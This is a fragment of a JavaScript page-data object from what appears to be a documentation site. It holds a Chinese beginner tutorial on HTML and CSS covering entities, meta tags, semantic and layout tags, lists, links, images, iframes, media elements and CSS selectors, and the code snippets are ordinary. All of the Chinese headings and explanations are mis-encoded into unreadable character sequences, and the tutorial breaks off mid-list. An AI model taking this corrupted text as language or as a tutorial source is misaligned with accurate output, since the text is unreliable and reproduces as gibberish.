·å¼",charIndex:5519},{level:3,title:"CSSç®ä»",slug:"cssç®ä»",normalizedTitle:"cssç®ä»",charIndex:5529},{level:3,title:"CSSåºæ¬è¯­æ³",slug:"cssåºæ¬è¯­æ³",normalizedTitle:"cssåºæ¬è¯­æ³",charIndex:6585},{level:3,title:"CSSéæ©å¨",slug:"csséæ©å¨",normalizedTitle:"csséæ©å¨",charIndex:6854},{level:3,title:"åä½",slug:"åä½",normalizedTitle:"åä½",charIndex:4215},{level:3,title:"é¢è²",slug:"é¢è²",normalizedTitle:"é¢è²",charIndex:9190},{level:3,title:"å¸å±",slug:"å¸å±",normalizedTitle:"å¸å±",charIndex:2749},{level:3,title:"æµ®å¨",slug:"æµ®å¨",normalizedTitle:"æµ®å¨",charIndex:15814},{level:3,title:"å®ä½",slug:"å®ä½",normalizedTitle:"å®ä½",charIndex:3906},{level:3,title:"å­ä½åèæ¯",slug:"å­ä½åèæ¯",normalizedTitle:"å­ä½åèæ¯",charIndex:26392},{level:3,title:"å¨ç»",slug:"å¨ç»",normalizedTitle:"å¨ç»",charIndex:31681},{level:3,title:"ååºå¼å¸å±",slug:"ååºå¼å¸å±",normalizedTitle:"ååºå¼å¸å±",charIndex:31688},{level:2,title:"ç»ä¹ ",slug:"ç»ä¹ ",normalizedTitle:"ç»ä¹ ",charIndex:31698}],headersStr:"HTML æ ç­¾ å®ä½ Metaæ ç­¾ è¯­ä¹åæ ç­¾ åè¡¨ è¶é¾æ¥ å¾çæ ç­¾ åèæ¡æ¶ å¤åªä½ è¡¨æ ¼ è¡¨å CSSæ ·å¼ CSSç®ä» CSSåºæ¬è¯­æ³ CSSéæ©å¨ åä½ é¢è² å¸å± æµ®å¨ å®ä½ å­ä½åèæ¯ å¨ç» ååºå¼å¸å± ç»ä¹ ",content:'# HTML & CSS åºç¡\n\n\n# HTML æ ç­¾\n\n\n# å®ä½\n\nå¦ææä»¬å¨ç½é¡µä¸­ç¼åçå¤ä¸ªç©ºæ ¼ï¼é»è®¤æåµä¼èªå¨è¢«æµè§å¨è§£æä¸ºä¸ä¸ªç©ºæ ¼ãå¦å¤å¨HTMLä¸­æäºæ¶åï¼æä»¬ä¸è½ç´æ¥ä¹¦åä¸äºç¹æ®ç¬¦å·ãæ¯å¦ï¼å¤ä¸ªè¿ç»­çç©ºæ ¼ï¼æ¯å¦å­æ¯ä¸¤ä¾§çå¤§äºåå°äºå·ãå¦ææä»¬éè¦å¨ç½é¡µä¸­ä¹¦åè¿äºç¹æ®çç¬¦å·ï¼åéè¦ä½¿ç¨htmlä¸­çå®ä½ï¼è½¬ä¹å­ç¬¦ï¼ï¼\n\n&å®ä½çåå­;\n&nbsp; ç©ºæ ¼\n&gt; å¤§äºå·\n&lt; å°äºå·\n&copy; çæç¬¦å·\n\n\n1\n2\n3\n4\n5\n\n\n\n# Metaæ ç­¾\n\nmetaä¸»è¦ç¨äºè®¾ç½®ç½é¡µä¸­çä¸äºåæ°æ®ï¼åæ°æ®ä¸æ¯ç»ç¨æ·ç\n\n * charset æå®ç½é¡µçå­ç¬¦é\n * name æå®çæ°æ®çåç§°\n * content æå®çæ°æ®çåå®¹\n * keywords è¡¨ç¤ºç½ç«çå³é®å­ï¼å¯ä»¥åæ¶æå®å¤ä¸ªå³é®å­ï¼å³é®å­é´ä½¿ç¨,éå¼\n\nmetaä¸»è¦ç¨äºè®¾ç½®ç½é¡µä¸­çä¸äºåæ°æ®ï¼åæ°æ®ä¸æ¯ç»ç¨æ·ç\ncharset æå®ç½é¡µçå­ç¬¦é\nname æå®çæ°æ®çåç§°\ncontent æå®çæ°æ®çåå®¹\n\nkeywords è¡¨ç¤ºç½ç«çå³é®å­ï¼å¯ä»¥åæ¶æå®å¤ä¸ªå³é®å­ï¼å³é®å­é´ä½¿ç¨,éå¼\n<meta name="Keywords" content="ç½ä¸è´­ç©,ç½ä¸åå,ææº,ç¬è®°æ¬,çµè,MP3,CD,VCD,DV,ç¸æº,æ°ç ,éä»¶,æè¡¨,å­å¨å¡,äº¬ä¸"/>\n<meta name="keywords" content="ç½è´­,ç½ä¸è´­ç©,å¨çº¿è´­ç©,ç½è´­ç½ç«,ç½è´­åå,è´­ç©ç½ç«,ç½è´­ä¸­å¿,è´­ç©ä¸­å¿,åè¶,äºé©¬é,åè¶äºé©¬é,äºé©¬éä¸­å½,joyo,amazon">\n\ndescription ç¨äºæå®ç½ç«çæè¿°\n<meta name="description" content="äº¬ä¸JD.COM-ä¸ä¸çç»¼åç½ä¸è´­ç©åå,éå®å®¶çµãæ°ç éè®¯ãçµèãå®¶å±ç¾è´§ãæè£æé¥°ãæ¯å©´ãå¾ä¹¦ãé£åç­æ°ä¸ä¸ªåçä¼è´¨åå.ä¾¿æ·ãè¯ä¿¡çæå¡ï¼ä¸ºæ¨æä¾ææ¦çç½ä¸è´­ç©ä½éª!"/>\nç½ç«çæè¿°ä¼æ¾ç¤ºå¨æç´¢å¼æçæç´¢çç»æä¸­\n\ntitleæ ç­¾çåå®¹ä¼ä½ä¸ºæç´¢ç»æçè¶é¾æ¥ä¸çæå­æ¾ç¤º\n\n<meta name="keywords" content="ç½è´­,ç½ä¸è´­ç©,å¨çº¿è´­ç©,ç½è´­ç½ç«,ç½è´­åå,è´­ç©ç½ç«,ç½è´­ä¸­å¿,è´­ç©ä¸­å¿,åè¶,äºé©¬é,åè¶äºé©¬é,äºé©¬éä¸­å½,joyo,amazon">\n\ndescription ç¨äºæå®ç½ç«çæè¿°\nç½ç«çæè¿°ä¼æ¾ç¤ºå¨æç´¢å¼æçæç´¢çç»æä¸­\ntitleæ ç­¾çåå®¹ä¼ä½ä¸ºæç´¢ç»æçè¶é¾æ¥ä¸çæå­æ¾ç¤º\n\n<meta name="description" content="äº¬ä¸JD.COM-ä¸ä¸çç»¼åç½ä¸è´­ç©åå,éå®å®¶çµãæ°ç éè®¯ãçµèãå®¶å±ç¾è´§ãæè£æé¥°ãæ¯å©´ãå¾ä¹¦ãé£åç­æ°ä¸ä¸ªåçä¼è´¨åå.ä¾¿æ·ãè¯ä¿¡çæå¡ï¼ä¸ºæ¨æä¾ææ¦çç½ä¸è´­ç©ä½éª!"/>\n\n--\x3e\n<meta name="keywords" content="HTML5,åç«¯,CSS3">\n<meta name="description" content="è¿æ¯ä¸ä¸ªéå¸¸ä¸éçç½ç«">\n\x3c!--\n<meta http-equiv="refresh" content="3;url=https://www.mozilla.org"> \nå°é¡µé¢éå®åå°å¦ä¸ä¸ªç½ç«\n--\x3e\n\x3c!-- <meta http-equiv="refresh" content="3;url=https://www.baidu.com"> --\x3e\n<title>Document</title>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n\n# è¯­ä¹åæ ç­¾\n\nå¨ç½é¡µä¸­HTMLä¸é¨ç¨æ¥è´è´£ç½é¡µçç»æï¼æä»¥å¨ä½¿ç¨htmlæ ç­¾æ¶ï¼åºè¯¥å³æ³¨çæ¯æ ç­¾çè¯­ä¹ï¼èä¸æ¯å®çæ ·å¼ã\n\n# æ é¢\n\n * h1 ~ h6 ä¸å±æå­çº§æ é¢\n\n * ä»h1~h6éè¦æ§éåï¼h1æéè¦ï¼h6æä¸éè¦\n   \n     -         h1å¨ç½é¡µä¸­çéè¦æ§ä»æ¬¡äºtitleæ ç­¾ï¼ä¸è¬æåµä¸ä¸ä¸ªé¡µé¢ä¸­åªä¼æä¸ä¸ªh1\n     -          ä¸è¬æåµä¸æ é¢æ ç­¾åªä¼ä½¿ç¨å°h1~h3ï¼h4~h6å¾å°ç¨\n     -         æ é¢æ ç­¾é½æ¯ååç´ \n     -          å¨é¡µé¢ä¸­ç¬å ä¸è¡çåç´ ç§°ä¸ºååç´ ï¼block elementï¼\n   \n\n<h1>ä¸çº§æ é¢</h1>\n<h2>äºçº§æ é¢</h2>\n<h3>ä¸çº§æ é¢</h3>\n<h4>åçº§æ é¢</h4>\n<h5>äºçº§æ é¢</h5>\n<h6>å­çº§æ é¢</h6>\n\n\x3c!-- \nhgroupæ ç­¾ç¨æ¥ä¸ºæ é¢åç»ï¼å¯ä»¥å°ä¸ç»ç¸å³çæ é¢åæ¶æ¾å¥å°hgroup\n\n--\x3e\n<hgroup>\n  <h1>åä¹¡å¶ä¹¦äºé¦</h1>\n  <h2>å¶ä¸</h2>\n</hgroup>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n# æå­æ ç­¾\n\næå­æ ç­¾åå«ï¼\n\n * pï¼ ååç´ ï¼è¡¨ç¤ºä¸ä¸ªæ®µè½\n * emï¼è¯­é³è¯­è°çå éï¼è¡ååç´ \n * strongï¼å¼ºè°ï¼è¡¨ç¤ºåå®¹éè¦\n * blockquoteï¼é¿å¼ç¨\n * qï¼ç­å¼ç¨\n * brï¼æ¢è¡\n\n\x3c!-- \npæ ç­¾è¡¨ç¤ºé¡µé¢ä¸­çä¸ä¸ªæ®µè½\n\npä¹æ¯ä¸ä¸ªååç´ \n--\x3e\n<p>å¨pæ ç­¾ä¸­çåå®¹å°±è¡¨ç¤ºä¸ä¸ªæ®µè½</p>\n<p>å¨pæ ç­¾ä¸­çåå®¹å°±è¡¨ç¤ºä¸ä¸ªæ®µè½</p>\n\n\x3c!-- \nemæ ç­¾ç¨äºè¡¨ç¤ºè¯­é³è¯­è°çä¸ä¸ªå é\n\nå¨é¡µé¢ä¸­ä¸ä¼ç¬å ä¸è¡çåç´ ç§°ä¸ºè¡ååç´ ï¼inline elementï¼\n--\x3e\n<p>ä»å¤©å¤©æ°<em>ç</em>ä¸éï¼</p>\n\n\x3c!-- \nstrongè¡¨ç¤ºå¼ºè°ï¼éè¦åå®¹ï¼\n--\x3e\n<p>ä½ ä»å¤©å¿é¡»è¦<strong>å®æä½ä¸</strong>ï¼</p>\n\né²è¿è¯´ï¼\n\x3c!-- blockquote è¡¨ç¤ºä¸ä¸ªé¿å¼ç¨ --\x3e\n<blockquote>\n  è¿å¥è¯ææ¯ä»æ¥æ²¡æè¯´è¿çï¼\n</blockquote>\n\n\x3c!-- \nqè¡¨ç¤ºä¸ä¸ªç­å¼ç¨\n--\x3e\nå­æ°<q>å­¦èæ¶ä¹ ä¹ï¼ä¹åµä¹åµï¼</q>\n\n\x3c!-- \nbræ ç­¾è¡¨ç¤ºé¡µé¢ä¸­çæ¢è¡\n--\x3e\n<br>\n<br>\n\nä»å¤©å¤©æ°çä¸é\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n\n\n# ååç´ åè¡ååç´ \n\nååç´ ï¼block elementï¼\n\n * å¨ç½é¡µä¸­ä¸è¬éè¿ååç´ æ¥å¯¹é¡µé¢è¿è¡å¸å±\n\nè¡ååç´ (inline elementï¼\n\n * è¡ååç´ ä¸»è¦ç¨æ¥åè£¹æå­\n\n * å¨ååç´ ä¸­æ¾è¡ååç´ ï¼èä¸ä¼å¨è¡ååç´ ä¸­æ¾ååç´ \n\n * ååç´ ä¸­åºæ¬ä¸ä»ä¹é½è½æ¾\n\n * påç´ ä¸­ä¸è½æ¾ä»»ä½çååç´ \n\næµè§å¨å¨è§£æç½é¡µæ¶ï¼ä¼èªå¨å¯¹ç½é¡µä¸­ä¸ç¬¦åè§èçåå®¹è¿è¡ä¿®æ­£\n\n * æ ç­¾åå¨äºæ ¹åç´ çå¤é¨\n * påç´ ä¸­åµå¥äºååç´ \n * æ ¹åç´ ä¸­åºç°äºé¤headåbodyä»¥å¤çå­åç´ \n\n# å¸å±æ ç­¾\n\n * header è¡¨ç¤ºç½é¡µçå¤´é¨\n * main è¡¨ç¤ºç½é¡µçä¸»ä½é¨å(ä¸ä¸ªé¡µé¢ä¸­åªä¼æä¸ä¸ªmain)\n * footer è¡¨ç¤ºç½é¡µçåºé¨\n * nav è¡¨ç¤ºç½é¡µä¸­çå¯¼èª\n * aside åä¸»ä½ç¸å³çå¶ä»åå®¹ï¼ä¾§è¾¹æ ï¼\n * article è¡¨ç¤ºä¸ä¸ªç¬ç«çæç« \n * section è¡¨ç¤ºä¸ä¸ªç¬ç«çåºåï¼ä¸è¾¹çæ ç­¾é½ä¸è½è¡¨ç¤ºæ¶ä½¿ç¨section\n * div æ²¡æè¯­ä¹ï¼å°±ç¨æ¥è¡¨ç¤ºä¸ä¸ªåºåï¼ç®åæ¥è®²divè¿æ¯æä»¬ä¸»è¦çå¸å±åç´ \n * span è¡ååç´ ï¼æ²¡æä»»ä½çè¯­ä¹ï¼ä¸è¬ç¨äºå¨ç½é¡µä¸­éä¸­æå­\n\n\n# åè¡¨\n\n# æåºåè¡¨\n\nä½¿ç¨olæ ç­¾æ¥åå»ºæ åºåè¡¨ï¼ä½¿ç¨liè¡¨ç¤ºåè¡¨é¡¹\n\n# æ åºåè¡¨\n\nä½¿ç¨ulæ ç­¾æ¥åå»ºæ åºåè¡¨ï¼ä½¿ç¨liè¡¨ç¤ºåè¡¨é¡¹\n\n# å®ä¹åè¡¨\n\nä½¿ç¨dlæ ç­¾æ¥åå»ºä¸ä¸ªå®ä¹åè¡¨ï¼ä½¿ç¨dtæ¥è¡¨ç¤ºå®ä¹çåå®¹ï¼ä½¿ç¨ddæ¥å¯¹åå®¹è¿è¡è§£éè¯´æ\n\n<ul>\n  <li>ç»æ</li>\n  <li>è¡¨ç°</li>\n  <li>è¡ä¸º</li>\n</ul>\n\n<ol>\n  <li>ç»æ</li>\n  <li>è¡¨ç°</li>\n  <li>è¡ä¸º</li>\n</ol>\n\n\n<dl>\n  <dt>ç»æ</dt>\n  <dd>ç»æè¡¨ç¤ºç½é¡µçç»æï¼ç»æç¨æ¥è§å®ç½é¡µä¸­åªéæ¯æ é¢ï¼åªéæ¯æ®µè½</dd>\n  <dd>ç»æè¡¨ç¤ºç½é¡µçç»æï¼ç»æç¨æ¥è§å®ç½é¡µä¸­åªéæ¯æ é¢ï¼åªéæ¯æ®µè½</dd>\n  <dd>ç»æè¡¨ç¤ºç½é¡µçç»æï¼ç»æç¨æ¥è§å®ç½é¡µä¸­åªéæ¯æ é¢ï¼åªéæ¯æ®µè½</dd>\n</dl>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# è¶é¾æ¥\n\nè¶é¾æ¥å¯ä»¥è®©æä»¬ä»ä¸ä¸ªé¡µé¢è·³è½¬å°å¶ä»é¡µé¢ï¼æèæ¯å½åé¡µé¢çå¶ä»çä½ç½®\n\nä½¿ç¨ a æ ç­¾æ¥å®ä¹è¶é¾æ¥ï¼href æå®è·³è½¬çç®æ è·¯å¾ãå¼å¯ä»¥æ¯ä¸ä¸ªå¤é¨ç½ç«çå°åï¼ä¹å¯ä»¥åä¸ä¸ªåé¨é¡µé¢çå°åãè¶é¾æ¥æ¯ä¹æ¯ä¸ä¸ªè¡ååç´ ï¼å¨aæ ç­¾ä¸­å¯ä»¥åµå¥é¤å®èªèº«å¤çä»»ä½åç´ ã\n\ntargetå±æ§ï¼ç¨æ¥æå®è¶é¾æ¥æå¼çä½ç½®ï¼_self é»è®¤å¼ å¨å½åé¡µé¢ä¸­æå¼è¶é¾æ¥ï¼_blank å¨ä¸ä¸ªæ°çè¦ä¹ä¸­æå¼è¶é¾æ¥ã\n\nå¯ä»¥ç´æ¥å°è¶é¾æ¥çhrefå±æ§è®¾ç½®ä¸º#ï¼è¿æ ·ç¹å»è¶é¾æ¥ä»¥åï¼é¡µé¢ä¸ä¼åçè·³è½¬ï¼èæ¯è½¬å°å½åé¡µé¢çé¡¶é¨çä½ç½®ãå¯ä»¥è·³è½¬å°é¡µé¢çæå®ä½ç½®ï¼åªéå°hrefå±æ§è®¾ç½® #ç®æ åç´ çidå±æ§å¼ã\n\n<a id="bottom" href="#">åå°é¡¶é¨</a>\n\n\n1\n\n\n\n# å¾çæ ç­¾\n\nå¾çæ ç­¾ç¨äºåå½åé¡µé¢ä¸­å¼å¥ä¸ä¸ªå¤é¨å¾çï¼ä½¿ç¨imgæ ç­¾æ¥å¼å¥å¤é¨å¾çï¼imgæ ç­¾æ¯ä¸ä¸ªèªç»ææ ç­¾ã imgè¿ç§åç´ å±äºæ¿æ¢åç´ ï¼ååè¡ååç´ ä¹é´ï¼å·æä¸¤ç§åç´ çç¹ç¹ï¼ã\n\nç¸å³å±æ§ï¼\n\n * src å±æ§æå®çæ¯å¤é¨å¾ççè·¯å¾ï¼è·¯å¾è§ååè¶é¾æ¥æ¯ä¸æ ·çï¼\n * alt å¾ççæè¿°ï¼è¿ä¸ªæè¿°é»è®¤æåµä¸ä¸ä¼æ¾ç¤ºï¼æäºæµè§å¨ä¼å¾çæ æ³å è½½æ¶æ¾ç¤ºï¼æç´¢å¼æä¼æ ¹æ®altä¸­çåå®¹æ¥è¯å«å¾çï¼å¦æä¸åaltå±æ§åå¾çä¸ä¼è¢«æç´¢å¼æææ¶å½\n * width å¾ççå®½åº¦ (åä½æ¯åç´ )\n * height å¾ççé«åº¦\n   * å®½åº¦åé«åº¦ä¸­å¦æåªä¿®æ¹äºä¸ä¸ªï¼åå¦ä¸ä¸ªä¼ç­æ¯ä¾ç¼©æ¾\n   * ä¸è¬æåµå¨pcç«¯ï¼ä¸å»ºè®®ä¿®æ¹å¾ççå¤§å°ï¼éè¦å¤å¤§çå¾çå°±è£å¤å¤§\n   * ä½æ¯å¨ç§»å¨ç«¯ï¼ç»å¸¸éè¦å¯¹å¾çè¿è¡ç¼©æ¾ï¼å¤§å¾ç¼©å°ï¼\n\n<img src="./img/1.gif" alt="æ¾é¼ ">\n\n<img width="200"  src="https://d2ggl082rr1mkp.cloudfront.net/category/IronMan_preview_1521810286_220_310.jpeg" alt="é¢éä¾ ">\n\n\n1\n2\n3\n\n\n\n# åèæ¡æ¶\n\nåèæ¡æ¶ï¼ç¨äºåå½åé¡µé¢ä¸­å¼å¥ä¸ä¸ªå¶ä»é¡µé¢\n\n * src æå®è¦å¼å¥çç½é¡µçè·¯å¾\n * frameborder æå®åèæ¡æ¶çè¾¹æ¡\n\n<iframe src="https://www.qq.com" width="800" height="600" frameborder="0"></iframe>\n<h1>Hello</h1>\n\n\n1\n2\n\n\n\n# å¤åªä½\n\naudio æ ç­¾ç¨æ¥åé¡µé¢ä¸­å¼å¥ä¸ä¸ªå¤é¨çé³é¢æä»¶çï¼é³è§é¢æä»¶å¼å¥æ¶ï¼é»è®¤æåµä¸ä¸åè®¸ç¨æ·èªå·±æ§å¶æ­æ¾åæ­¢ã\n\n * controls æ¯å¦åè®¸ç¨æ·æ§å¶æ­æ¾\n\n * autoplay é³é¢æä»¶æ¯å¦èªå¨æ­æ¾\n\n * å¦æè®¾ç½®äºautoplay åé³ä¹å¨æå¼é¡µé¢æ¶ä¼èªå¨æ­æ¾\n\n * ä½æ¯ç®åæ¥è®²å¤§é¨åæµè§å¨é½ä¸ä¼èªå¨å¯¹é³ä¹è¿è¡æ­æ¾\n\n * loop é³ä¹æ¯å¦å¾ªç¯æ­æ¾\n\n\x3c!-- <audio src="./source/audio.mp3" controls autoplay loop></audio> --\x3e\n\x3c!-- <audio src="./source/audio.mp3" controls></audio> --\x3e\n\x3c!-- é¤äºéè¿srcæ¥æå®å¤é¨æä»¶çè·¯å¾ä»¥å¤ï¼è¿å¯ä»¥éè¿sourceæ¥æå®æä»¶çè·¯å¾ --\x3e\n<audio controls>\n  \x3c!-- å¯¹ä¸èµ·ï¼æ¨çæµè§å¨ä¸æ¯ææ­æ¾é³é¢ï¼è¯·åçº§æµè§å¨ï¼ --\x3e\n  <source src="./source/audio.mp3">\n  <source src="./source/audio.ogg">\n  <embed src="./source/audio.mp3" type="audio/mp3" width="300" height="100">\n</audio>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nä½¿ç¨videoæ ç­¾æ¥åç½é¡µä¸­å¼å¥ä¸ä¸ªè§é¢ï¼ä½¿ç¨æ¹å¼åaudioåºæ¬ä¸æ¯ä¸æ ·ç\n\n<video controls>\n  <source src="./source/flower.webm">\n  <source src="./source/flower.mp4">\n  <embed src="./source/flower.mp4" type="video/mp4">\n</video>\n\n\n1\n2\n3\n4\n5\n\n\n\n# è¡¨æ ¼\n\n\n# è¡¨å\n\n\n# CSSæ ·å¼\n\n\n# CSSç®ä»\n\nç½é¡µåæä¸ä¸ªé¨åï¼\n\n * ç»æ(HTML)\n * è¡¨ç°(CSS)\n * è¡ä¸º(JavaScript)\n\nCSSå¨ç§°Cascading Style Sheetsï¼å±å æ ·å¼è¡¨ãç½é¡µå®éä¸æ¯ä¸ä¸ªå¤å±çç»æï¼éè¿CSSå¯ä»¥åå«ä¸ºç½é¡µçæ¯ä¸ä¸ªå±æ¥è®¾ç½®æ ·å¼\n\nèæç»æä»¬è½çå°åªæ¯ç½é¡µçæä¸è¾¹ä¸å±ãæ»ä¹ä¸å¥è¯ï¼CSSç¨æ¥è®¾ç½®ç½é¡µä¸­åç´ çæ ·å¼ã\n\nä½¿ç¨CSSæ¥ä¿®æ¹åç´ çæ ·å¼ï¼æä»¥ä¸ä¸ç§æ¹å¼ï¼\n\n * ç¬¬ä¸ç§æ¹å¼(åèæ ·å¼ï¼è¡åæ ·å¼)ï¼\n   * å¨æ ç­¾åé¨éè¿styleå±æ§æ¥è®¾ç½®åç´ çæ ·å¼\n   * ä½¿ç¨åèæ ·å¼ï¼æ ·å¼åªè½å¯¹ä¸ä¸ªæ ç­¾çæï¼å¦æå¸æå½±åå°å¤ä¸ªåç´ å¿é¡»å¨æ¯ä¸ä¸ªåç´ ä¸­é½å¤å¶ä¸é\n   * å¹¶ä¸å½æ ·å¼åçååæ¶ï¼æä»¬å¿é¡»è¦ä¸ä¸ªä¸ä¸ªçä¿®æ¹ï¼éå¸¸çä¸æ¹ä¾¿\n   * æ³¨æï¼å¼åæ¶ç»å¯¹ä¸è¦ä½¿ç¨åèæ ·å¼\n\n<p style="color:red; font-size: 60px;">å°å°ç¦»å®¶èå¤§åï¼ä¹¡é³æ æ¹é¬æ¯è¡°</p>\n\n<p style="color: red; font-size: 60px;">ä»å¤©å¤©æ°çä¸éï¼</p>\n\n\n1\n2\n3\n\n\n * ç¬¬äºç§æ¹å¼ï¼åé¨æ ·å¼è¡¨ï¼\n   \n   * å°æ ·å¼ç¼åå°headä¸­çstyleæ ç­¾éï¼ç¶åéè¿CSSçéæ©å¨æ¥éä¸­åç´ å¹¶ä¸ºå¶è®¾ç½®åç§æ ·å¼\n   \n   * å¯ä»¥åæ¶ä¸ºå¤ä¸ªæ ç­¾è®¾ç½®æ ·å¼ï¼å¹¶ä¸ä¿®æ¹æ¶åªéè¦ä¿®æ¹ä¸å¤å³å¯å¨é¨åºç¨\n   \n   * åé¨æ ·å¼è¡¨æ´å æ¹ä¾¿å¯¹æ ·å¼è¿è¡å¤ç¨\n   \n   * æä»¬çåé¨æ ·å¼è¡¨åªè½å¯¹ä¸ä¸ªç½é¡µèµ·ä½ç¨ï¼å®éè¾¹çæ ·å¼ä¸è½è·¨é¡µé¢è¿è¡å¤ç¨\n\n<style>\n\n  p{\n    color: green;\n    font-size: 50px;\n  }\n\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n * ç¬¬ä¸ç§æ¹å¼ ï¼å¤é¨æ ·å¼è¡¨ï¼ æä½³å®è·µ\n   * å¯ä»¥å°CSSæ ·å¼ç¼åå°ä¸ä¸ªå¤é¨çCSSæä»¶ä¸­ï¼ç¶åéè¿linkæ ç­¾æ¥å¼å¥å¤é¨çCSSæä»¶\n   * å¤é¨æ ·å¼è¡¨éè¦éè¿linkæ ç­¾è¿è¡å¼å¥ï¼æå³çåªè¦æ³ä½¿ç¨è¿äºæ ·å¼çç½é¡µé½å¯ä»¥å¯¹å¶è¿è¡å¼ç¨ãä½¿æ ·å¼å¯ä»¥å¨ä¸åé¡µé¢ä¹é´è¿è¡å¤ç¨\n   * å°æ ·å¼ç¼åå°å¤é¨çCSSæä»¶ä¸­ï¼å¯ä»¥ä½¿ç¨å°æµè§å¨çç¼å­æºå¶ï¼ä»èå å¿«ç½é¡µçå è½½éåº¦ï¼æé«ç¨æ·çä½éªã\n\n<link rel="stylesheet" href="./style.css">\n\n\n1\n\n\np{\n    color: tomato;\n    font-size: 50px;\n}\n\n\n1\n2\n3\n4\n\n\n\n# CSSåºæ¬è¯­æ³\n\nCSSç±ä¸¤é¨åç»æï¼éæ©å¨åå£°æåï¼å¶ä¸­éæ©å¨ç¨äºéä¸­éè¦æ·»å æ ·å¼çåç´ ï¼å£°æåæ¯å¯¹æ ·å¼çå·ä½è®¾ç½®ã\n\n * éæ©å¨ï¼éè¿éæ©å¨å¯ä»¥éä¸­é¡µé¢ä¸­çæå®åç´ ãæ¯å¦ p çä½ç¨å°±æ¯éä¸­é¡µé¢ä¸­ææçpåç´ \n * å£°æåï¼éè¿å£°æåæ¥æå®è¦ä¸ºåç´ è®¾ç½®çæ ·å¼ï¼å£°æåç±ä¸ä¸ªä¸ä¸ªçå£°æç»æï¼ä¸ä¸ªåå¼å¯¹ç»æãä¸ä¸ªæ ·å¼åå¯¹åºä¸ä¸ªæ ·å¼å¼ï¼ååå¼ä¹é´ä»¥:è¿æ¥ï¼ä»¥;ç»å°¾ã\n\np{\n  color: red;\n  font-size: 40px;\n}\n\nh1{\n  color: green;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# CSSéæ©å¨\n\n# åç´ éæ©å¨\n\nä½ç¨ï¼æ ¹æ®æ ç­¾åæ¥éä¸­æå®çåç´ \n\nè¯­æ³ï¼æ ç­¾å{}\n\nä¾å­ï¼p{} h1{} div{}\n\n# IDéæ©å¨\n\nä½ç¨ï¼æ ¹æ®åç´ çidå±æ§å¼éä¸­ä¸ä¸ªåç´ \n\nè¯­æ³ï¼#idå±æ§å¼{}\n\nä¾å­ï¼#box{} #red{}\n\n# ç±»éæ©å¨\n\nä½ç¨ï¼æ ¹æ®åç´ çclasså±æ§å¼éä¸­ä¸ç»åç´ \n\nè¯­æ³ï¼.classå±æ§å¼\n\n# éééæ©å¨\n\nä½ç¨ï¼éä¸­é¡µé¢ä¸­çææåç´ \n\nè¯­æ³: *\n\n# äº¤ééæ©å¨\n\nä½ç¨ï¼éä¸­åæ¶å¤åå¤ä¸ªæ¡ä»¶çåç´ \n\nè¯­æ³ï¼éæ©å¨1éæ©å¨2éæ©å¨3éæ©å¨n{}\n\næ³¨æç¹ï¼äº¤ééæ©å¨ä¸­å¦ææåç´ éæ©å¨ï¼å¿é¡»ä½¿ç¨åç´ éæ©å¨å¼å¤´\n\ndiv.red{\n    font-size: 30px;\n}\n\n.a.b.c{\n    color: blue\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n# éæ©å¨åç»\n\néæ©å¨åç»ï¼å¹¶ééæ©å¨ï¼\n\nä½ç¨ï¼åæ¶éæ©å¤ä¸ªéæ©å¨å¯¹åºçåç´ \n\nè¯­æ³ï¼éæ©å¨1,éæ©å¨2,éæ©å¨3,éæ©å¨n{}\n\n#b1,.p1,h1,span,div.red{}\n\n# å­åç´ éæ©å¨\n\nç¶åç´ \n\n * ç´æ¥åå«å­åç´ çåç´ å«åç¶åç´ \n\nå­åç´ \n\n * ç´æ¥è¢«ç¶åç´ åå«çåç´ æ¯å­åç´ \n\nç¥ååç´ \n\n * ç´æ¥æé´æ¥åå«åä»£åç´ çåç´ å«åç¥ååç´ \n * ä¸ä¸ªåç´ çç¶åç´ ä¹æ¯å®çç¥ååç´ \n\nåä»£åç´ \n\n * ç´æ¥æé´æ¥è¢«ç¥ååç´ åå«çåç´ å«ååä»£åç´ \n * å­åç´ ä¹æ¯åä»£åç´ \n\nåå¼åç´ \n\n * æ¥æç¸åç¶åç´ çåç´ æ¯åå¼åç´ \n\nä½ç¨ï¼éä¸­æå®ç¶åç´ çæå®å­åç´ \n\nè¯­æ³ï¼ç¶åç´  > å­åç´ \n\n# åä»£éæ©å¨\n\nä½ç¨ï¼éä¸­æå®åç´ åçæå®åä»£åç´ \n\nè¯­æ³ï¼ç¥å åä»£\n\n# åå¼åç´ éæ©å¨\n\n * éæ©ä¸ä¸ä¸ªåå¼\n\nè¯­æ³ï¼åä¸ä¸ª + ä¸ä¸ä¸ª\n\n * éæ©ä¸è¾¹ææçåå¼\n\nè¯­æ³ï¼å ~ å¼\n\n# å±æ§éæ©å¨\n\n[å±æ§å] éæ©å«ææå®å±æ§çåç´ \n\n[å±æ§å=å±æ§å¼] éæ©å«ææå®å±æ§åå±æ§å¼çåç´ \n\n[å±æ§å^=å±æ§å¼] éæ©å±æ§å¼ä»¥æå®å¼å¼å¤´çåç´ \n\n[å±æ§å$=å±æ§å¼] éæ©å±æ§å¼ä»¥æå®å¼ç»å°¾çåç´ \n\n[å±æ§å*=å±æ§å¼] éæ©å±æ§å¼ä¸­å«ææå¼çåç´ çåç´ \n\n# ä¼ªç±»éæ©å¨\n\nä¼ªç±»ï¼ä¸å­å¨çç±»ï¼ç¹æ®çç±»ï¼\n\n * ä¼ªç±»ç¨æ¥æè¿°ä¸ä¸ªåç´ çç¹æ®ç¶æ\n\næ¯å¦ï¼ç¬¬ä¸ä¸ªå­åç´ ãè¢«ç¹å»çåç´ ãé¼ æ ç§»å¥çåç´ ...\n\nä¼ªç±»ä¸è¬æåµä¸é½æ¯ä½¿ç¨:å¼å¤´\n\n * :first-child ç¬¬ä¸ä¸ªå­åç´ \n\n * :last-child æåä¸ªå­åç´ 